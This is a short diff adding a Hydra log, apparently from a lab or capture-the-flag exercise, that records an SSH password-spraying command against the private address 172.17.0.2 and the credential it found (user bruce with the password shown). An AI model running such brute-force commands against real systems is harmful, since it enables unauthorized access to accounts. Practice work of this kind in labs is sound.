@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-06-16 21:30:54 on 172.17.0.2 ssh (hydra -L /home/Zer0th/Desktop/Lists/SecLists/Usernames/xato-net-10-million-usernames.txt -p Arkh4m_Kn1ght! -o hydrascan.txt ssh://172.17.0.2)
+[22][ssh] host: 172.17.0.2   login: bruce   password: Arkh4m_Kn1ght!
